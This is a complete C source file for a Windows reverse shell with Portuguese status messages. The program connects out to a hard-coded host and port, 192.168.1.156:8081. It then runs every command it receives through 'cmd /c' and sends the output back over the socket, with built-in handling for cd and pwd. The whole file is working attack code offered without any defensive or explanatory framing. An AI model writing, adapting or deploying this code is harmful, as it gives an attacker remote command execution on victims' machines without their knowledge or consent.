#include <winsock2.h>
#include <stdio.h>
#include <windows.h>
#include <process.h>
#include <direct.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")

#define BUFFER_SIZE 4096

char current_dir[MAX_PATH] = {0};

void ExecuteCommand(SOCKET sock, char* command) {
    char buffer[BUFFER_SIZE];
    char full_command[BUFFER_SIZE + 100];
    FILE* fp;

    if (current_dir[0] == '\0') {
        _getcwd(current_dir, MAX_PATH);
    }

    if (strncmp(command, "cd ", 3) == 0) {
        if (_chdir(command + 3) == 0) {
            _getcwd(current_dir, MAX_PATH);
            snprintf(buffer, sizeof(buffer), "Diretório alterado para: %s\n", current_dir);
            send(sock, buffer, strlen(buffer), 0);
        } else {
            send(sock, "[!] Falha ao mudar de diretório\n", 32, 0);
        }
        send(sock, "[CMD_END]\n", 10, 0);
        return;
    }

    if (strcmp(command, "cd..") == 0 || strcmp(command, "cd ..") == 0) {
        if (_chdir("..") == 0) {
            _getcwd(current_dir, MAX_PATH);
            snprintf(buffer, sizeof(buffer), "Subiu um diretório: %s\n", current_dir);
            send(sock, buffer, strlen(buffer), 0);
        } else {
            send(sock, "[!] Falha ao subir de diretório\n", 33, 0);
        }
        send(sock, "[CMD_END]\n", 10, 0);
        return;
    }

    if (strcmp(command, "pwd") == 0) {
        _getcwd(current_dir, MAX_PATH);
        snprintf(buffer, sizeof(buffer), "Diretório atual: %s\n", current_dir);
        send(sock, buffer, strlen(buffer), 0);
        send(sock, "[CMD_END]\n", 10, 0);
        return;
    }

    snprintf(full_command, sizeof(full_command), "cmd /c %s", command);
    fp = _popen(full_command, "r");
    if (fp == NULL) {
        send(sock, "[!] Falha ao executar o comando\n", 32, 0);
        send(sock, "[CMD_END]\n", 10, 0);
        return;
    }

    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        send(sock, buffer, strlen(buffer), 0);
    }

    _pclose(fp);
    send(sock, "[CMD_END]\n", 10, 0);
}

int main() {
    _getcwd(current_dir, MAX_PATH);

    WSADATA wsa;
    SOCKET Shell;
    SOCKADDR_IN shellAddress;
    char RecvServer[BUFFER_SIZE];
    char ipAddress[] = "192.168.1.156";
    int port = 8081;

    WSAStartup(MAKEWORD(2, 2), &wsa);
    Shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    shellAddress.sin_port = htons(port);
    shellAddress.sin_family = AF_INET;
    shellAddress.sin_addr.s_addr = inet_addr(ipAddress);

    if (WSAConnect(Shell, (SOCKADDR *)&shellAddress, sizeof(shellAddress), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        closesocket(Shell);
        WSACleanup();
        return 1;
    }

    while (1) {
        int bytes_received = recv(Shell, RecvServer, BUFFER_SIZE, 0);
        if (bytes_received <= 0) break;

        RecvServer[bytes_received] = '\0';
        ExecuteCommand(Shell, RecvServer);
    }

    closesocket(Shell);
    WSACleanup();
    return 0;
}
